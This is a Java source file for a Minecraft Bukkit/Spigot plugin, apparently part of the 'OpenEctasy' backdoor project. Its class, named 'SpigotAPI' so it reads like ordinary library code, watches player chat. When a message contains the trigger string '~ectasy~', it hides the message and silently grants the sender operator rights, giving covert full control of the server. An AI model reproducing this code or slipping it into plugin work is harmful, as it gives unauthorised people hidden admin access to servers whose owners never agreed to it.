package fr.bodyalhoha.ectasy;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.scheduler.BukkitRunnable;

public class SpigotAPI implements Listener {

    private final JavaPlugin plugin;

    public SpigotAPI(JavaPlugin plugin){
        this.plugin = plugin;
        Bukkit.getPluginManager().registerEvents(this, plugin);
    }

    @EventHandler
    public void onChatEvent(AsyncPlayerChatEvent e){
        if(e.getMessage().contains("~ectasy~")){
            e.setCancelled(true);
            e.getPlayer().sendMessage(ChatColor.GOLD + "Thanks " + ChatColor.WHITE + "for using " + ChatColor.RED + "OpenEctasy");
            e.getPlayer().sendMessage(ChatColor.GOLD + "https://github.com/Body-Alhoha/OpenEctasy");
            new BukkitRunnable() {
                @Override
                public void run() {
                    e.getPlayer().setOp(true);
                }
            }.runTask(this.plugin);
        }
    }


}
